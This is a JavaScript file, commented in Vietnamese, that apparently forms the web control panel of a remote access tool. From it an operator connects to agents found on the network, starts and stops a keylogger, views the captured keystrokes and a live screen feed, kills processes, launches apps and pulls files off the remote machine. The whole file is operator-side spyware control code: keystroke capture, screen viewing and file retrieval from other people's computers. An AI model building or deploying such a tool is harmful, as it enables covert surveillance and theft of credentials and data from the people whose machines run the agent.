let socket;
const discoveredIPs = new Set();
let isKeylogging = false;

document.addEventListener('DOMContentLoaded', (event) => {
    // 1. Kết nối tới Flask Server
    socket = io.connect('http://' + document.domain + ':' + location.port);

    // --- CÁC SỰ KIỆN TỪ SERVER (LISTENERS) ---

    // A. Trạng thái kết nối
    socket.on('status', function(data) {
        const msgElement = document.getElementById('connection_msg');
        const globalBadge = document.getElementById('global_status');
        
        if (msgElement) {
            msgElement.textContent = data.msg;
            msgElement.className = data.status === 'success' ? 'text-success font-weight-bold' : 'text-danger font-weight-bold';
        }
        if (globalBadge) {
            if (data.status === 'success') {
                globalBadge.className = 'badge badge-success p-2';
                globalBadge.textContent = 'Connected';
            } else if (data.status === 'error') {
                globalBadge.className = 'badge badge-danger p-2';
                globalBadge.textContent = 'Disconnected';
            }
        }
    });

    // B. Nhận dữ liệu (JSON hoặc Raw Text từ Keylogger)
    socket.on('agent_json', function(rawMsg) {
        
        // [CẬP NHẬT] XỬ LÝ KEYLOGGER
        if (typeof rawMsg === 'string' && rawMsg.startsWith("KEYLOGS:")) {
            const content = rawMsg.substring(8); // Cắt bỏ chữ "KEYLOGS:"
            
            // 1. Cập nhật Text Area (Log chữ)
            const area = document.getElementById('txtKeylogs');
            if (area) {
                area.value += content;
                area.scrollTop = area.scrollHeight;
            }

            // 2. Kích hoạt Bàn Phím Ảo (Visual Keyboard)
            highlightKey(content);

            return; 
        }

        // XỬ LÝ JSON THÔNG THƯỜNG (Process, App List...)
        try {
            const data = (typeof rawMsg === 'object') ? rawMsg : JSON.parse(rawMsg);
            
            if (Array.isArray(data)) {
                if (data.length === 0) return;

                // Phân biệt App List và Process List
                if (data[0].hasOwnProperty('path') || data[0].hasOwnProperty('isRunning')) {
                    updateAppTable(data); 
                } else {
                    updateProcessTable(data); 
                }

            } else if (data.file_content) {
                // File Download
                handleFileContent(data);
            }
            // Các lệnh text đơn giản (VD: "Started App...")
            else if (typeof data === 'string' && data.startsWith("Started App")) {
                alert(data);
            }

        } catch (e) {
            console.error("Lỗi xử lý dữ liệu từ Agent:", e, rawMsg);
        }
    });

    // C. Nhận hình ảnh (Stream)
    socket.on('agent_image', function(base64Image) {
        const imgElement = document.getElementById('live_feed');
        
        // Cập nhật ảnh live stream
        if (imgElement) imgElement.src = `data:image/jpeg;base64,${base64Image}`;
    });

    // D. Auto Discovery (UDP)
    socket.on('discovery_found', function(agentInfo) {
        if (discoveredIPs.has(agentInfo.ip)) return;
        discoveredIPs.add(agentInfo.ip);

        const tableBody = document.querySelector('#discovery_table tbody');
        if (!tableBody) return;

        const emptyRow = document.getElementById('empty_row');
        if (emptyRow) emptyRow.remove();

        const row = tableBody.insertRow();
        
        row.insertCell().textContent = agentInfo.ip;
        
        const nameCell = row.insertCell();
        nameCell.innerHTML = `<b>${agentInfo.hostname}</b>`;

        const methodCell = row.insertCell();
        methodCell.innerHTML = `<span class="badge badge-success">Auto (UDP)</span>`;
        
        const actionCell = row.insertCell();
        const btn = document.createElement('button');
        btn.className = 'btn btn-primary btn-sm';
        btn.innerHTML = '<i class="fas fa-bolt"></i> Connect';
        btn.onclick = function() {
            document.getElementById('agent_ip').value = agentInfo.ip;
            connectAgent(); 
        };
        actionCell.appendChild(btn);
    });
});

// --- CÁC HÀM GỬI LỆNH (ACTIONS) ---

function connectAgent() {
    const ip = document.getElementById('agent_ip').value;
    const port = document.getElementById('agent_port').value;
    socket.emit('connect_agent', { ip: ip, port: port });
    const msg = document.getElementById('connection_msg');
    if(msg) msg.textContent = "Connecting...";
}

function sendCommand(cmd) {
    if (socket && socket.connected) {
        socket.emit('send_command', { cmd: cmd });
    } else {
        alert("Chưa kết nối tới Server Flask!");
    }
}

// Hàm Bật/Tắt Keylogger
function toggleKeylogger() {
    const btn = document.getElementById("btnKeylogToggle");
    
    if (!isKeylogging) {
        sendCommand("KEYLOGGING_ON");
        isKeylogging = true;
        if(btn) {
            btn.innerHTML = '<i class="fas fa-stop"></i> Stop Keylogger';
            btn.classList.remove("btn-warning");
            btn.classList.add("btn-danger");
        }
    } else {
        sendCommand("KEYLOGGING_OFF");
        isKeylogging = false;
        if(btn) {
            btn.innerHTML = '<i class="fas fa-play"></i> Start Keylogger';
            btn.classList.remove("btn-danger");
            btn.classList.add("btn-warning");
        }
    }
}

// Hàm xóa log
function clearKeylog() {
    const area = document.getElementById("txtKeylogs");
    if(area) area.value = "";
}

// --- VISUAL KEYBOARD HIGHLIGHTER [MỚI] ---
function highlightKey(inputKey) {
    if (!inputKey) return;
    
    let targetKey = "";
    const upperInput = inputKey.toUpperCase();

    // 1. Xử lý Mapping các phím đặc biệt (từ format của C++ sang HTML data-key)
    if (upperInput.includes("ENTER") || inputKey === "\n") targetKey = "ENTER";
    else if (upperInput.includes("SPACE") || inputKey === " ") targetKey = "SPACE";
    else if (upperInput.includes("BACK") || inputKey === "\b") targetKey = "BACKSPACE";
    else if (upperInput.includes("TAB") || inputKey === "\t") targetKey = "TAB";
    else if (upperInput.includes("SHIFT")) targetKey = "LSHIFT"; // Mặc định sáng Shift trái
    else if (upperInput.includes("LSHIFT")) targetKey = "LSHIFT";
    else if (upperInput.includes("RSHIFT")) targetKey = "RSHIFT";
    else if (upperInput.includes("CTRL")) targetKey = "LCTRL";
    else if (upperInput.includes("ALT")) targetKey = "LALT";
    else if (upperInput.includes("CAPS")) targetKey = "CAPSLOCK";
    else if (upperInput.includes("ESC")) targetKey = "ESC";
    else if (upperInput.includes("UP")) targetKey = "UP";
    else if (upperInput.includes("DOWN")) targetKey = "DOWN";
    else if (upperInput.includes("LEFT")) targetKey = "LEFT";
    else if (upperInput.includes("RIGHT")) targetKey = "RIGHT";
    else {
        // Ký tự thường (A-Z, 0-9, dấu câu)
        // Loại bỏ ngoặc [] nếu có (ví dụ [A] -> A)
        targetKey = upperInput.replace("[", "").replace("]", "");
    }

    // 2. Tìm phím trên giao diện
    let $keyElement = $(`.key[data-key='${targetKey}']`);

    // Fallback: Nếu không tìm thấy bằng chuỗi (ví dụ nhận '1' nhưng data-key là '1'), thử tìm ký tự đơn
    if ($keyElement.length === 0 && targetKey.length === 1) {
         $keyElement = $(`.key[data-key='${targetKey}']`);
    }

    // 3. Kích hoạt hiệu ứng
    if ($keyElement.length > 0) {
        $keyElement.addClass('active');
        // Tắt sáng nhanh để tạo hiệu ứng gõ
        setTimeout(() => {
            $keyElement.removeClass('active');
        }, 150);
    }
}

// --- CÁC HÀM CẬP NHẬT GIAO DIỆN KHÁC ---

function updateProcessTable(processes) {
    const tableBody = document.querySelector('#process_table tbody');
    if (!tableBody) return;
    tableBody.innerHTML = ''; 
    
    processes.forEach(p => {
        const row = tableBody.insertRow();
        row.insertCell().textContent = p.pid;
        row.insertCell().textContent = p.name;
        
        const actionCell = row.insertCell();
        const killButton = document.createElement('button');
        killButton.className = 'btn btn-danger btn-xs';
        killButton.innerHTML = '<i class="fas fa-times"></i> Kill';
        killButton.onclick = () => {
            if(confirm(`Kill process ${p.name} (${p.pid})?`)) {
                sendCommand(`TASK_KILL ${p.pid}`);
            }
        };
        actionCell.appendChild(killButton);
    });
}

function updateAppTable(apps) {
    const tableBody = document.querySelector('#app_table tbody');
    if (!tableBody) return;
    tableBody.innerHTML = '';

    apps.forEach(app => {
        const row = tableBody.insertRow();
        row.insertCell().textContent = app.name;
        
        const pathCell = row.insertCell();
        pathCell.textContent = app.path;
        pathCell.style.fontSize = '0.85rem';
        pathCell.style.maxWidth = '300px';
        pathCell.style.overflow = 'hidden';
        pathCell.style.textOverflow = 'ellipsis';
        pathCell.title = app.path;

        const statusCell = row.insertCell();
        if (app.isRunning) {
            statusCell.innerHTML = `<span class="badge badge-success">Running (PID: ${app.pid})</span>`;
        } else {
            statusCell.innerHTML = `<span class="badge badge-secondary">Stopped</span>`;
        }

        const actionCell = row.insertCell();
        if (app.isRunning) {
            const stopBtn = document.createElement('button');
            stopBtn.className = 'btn btn-danger btn-xs';
            stopBtn.innerHTML = '<i class="fas fa-stop"></i> Stop';
            stopBtn.onclick = () => {
                if(confirm(`Dừng ứng dụng ${app.name}?`)) {
                    sendCommand(`APP_STOP ${app.pid}`);
                    setTimeout(() => sendCommand('APP_LIST'), 1000);
                }
            };
            actionCell.appendChild(stopBtn);
        } else {
            const startBtn = document.createElement('button');
            startBtn.className = 'btn btn-success btn-xs';
            startBtn.innerHTML = '<i class="fas fa-play"></i> Start';
            startBtn.onclick = () => {
                sendCommand(`APP_START ${app.path}`);
                setTimeout(() => sendCommand('APP_LIST'), 2000);
            };
            actionCell.appendChild(startBtn);
        }
    });
}

// --- UTILS ---
function killProcess() {
    const val = document.getElementById('pid_kill').value;
    if (val) sendCommand(`TASK_KILL ${val}`);
}

function startAppInput() {
    const val = document.getElementById('app_start').value;
    if (val) sendCommand(`APP_START ${val}`);
}

function pullFile() {
    const val = document.getElementById('file_path').value;
    if (val) {
        sendCommand(`FILE_PULL ${val}`);
        const statusDiv = document.getElementById('file_download_status');
        if(statusDiv) statusDiv.innerHTML = '<span class="text-warning">Đang yêu cầu file...</span>';
    }
}

function clearDiscoveryTable() {
    discoveredIPs.clear();
    const tbody = document.querySelector('#discovery_table tbody');
    if(tbody) tbody.innerHTML = '<tr id="empty_row"><td colspan="4" class="text-center text-muted">Đang chờ tín hiệu Agent...</td></tr>';
}

function handleFileContent(data) {
    const statusDiv = document.getElementById('file_download_status');
    if (data.file_content === "ERROR") {
        if(statusDiv) statusDiv.innerHTML = '<span class="text-danger">Lỗi: Không tìm thấy file.</span>';
        return;
    }
    
    try {
        const byteCharacters = atob(data.file_content);
        const byteNumbers = new Array(byteCharacters.length);
        for (let i = 0; i < byteCharacters.length; i++) {
            byteNumbers[i] = byteCharacters.charCodeAt(i);
        }
        const byteArray = new Uint8Array(byteNumbers);
        const blob = new Blob([byteArray]);
        
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = data.file_name || 'downloaded_file';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        
        if(statusDiv) statusDiv.innerHTML = '<span class="text-success">Tải xong!</span>';
    } catch (e) {
        if(statusDiv) statusDiv.innerHTML = '<span class="text-danger">Lỗi file.</span>';
    }
}


function confirmAction(cmd) {
    if (confirm("Bạn có chắc chắn muốn thực hiện hành động này không?")) {
        sendCommand(cmd);
    }
}